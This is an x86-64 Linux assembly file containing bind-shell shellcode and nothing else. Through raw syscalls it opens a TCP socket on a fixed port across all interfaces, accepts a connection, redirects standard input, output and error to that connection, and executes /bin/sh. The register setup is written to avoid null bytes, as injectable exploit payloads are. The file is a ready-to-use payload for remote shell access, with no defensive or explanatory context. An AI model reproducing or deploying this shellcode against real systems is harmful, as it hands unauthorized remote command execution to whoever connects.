section .text
	global _start
_start:
	nop
; sockfd = socket(2, 1, 0)/(AF_INET, SOCK_STREAM, 0)
	xor rax, rax
	add rax, 41
	xor rdi, rdi
	add rdi, 2
	xor rsi, rsi
	inc rsi
	xor rdx, rdx
	syscall
; return resutl in RAX
	mov rdi, rax
; bind structure
	xor rax, rax
	push rax			; All interfaces
	push word 0xd204	; port
	push word 0x02		; AF_INET
; bind function
	mov rsi, rsp
	xor rdx, rdx
	add rdx, 16
	xor rax, rax
	add rax, 49
	syscall
; listen function
	xor rax, rax
	add rax, 50
	xor rsi, rsi
	inc rsi
	syscall
; accept fnction
	xor rax, rax
	add rax, 43
	xor rsi, rsi
	xor rdx, rdx
	syscall
; return of accept is store in RAX
	mov rbx, rax
; dup2 (0, 1, 2)
; dup2 stdin
	mov rdi, rbx
	xor rax, rax
	add rax, 33
	xor rsi, rsi    ; 0
	syscall
; dup2 stdout
	xor rax, rax
	add rax, 33
	inc rsi         ; 1
	syscall
; dup2 stderr
	xor rax, rax
	add rax, 33
	inc rsi         ; 2
	syscall
; execve
	xor rax, rax
	push rax
	mov rdx, rsp
	mov rbx, 0x68732f6e69622f2f
	push rbx
	mov rdi, rsp
	push rax
	push rdi
	mov rsi, rsp
	add rax, 59
	syscall
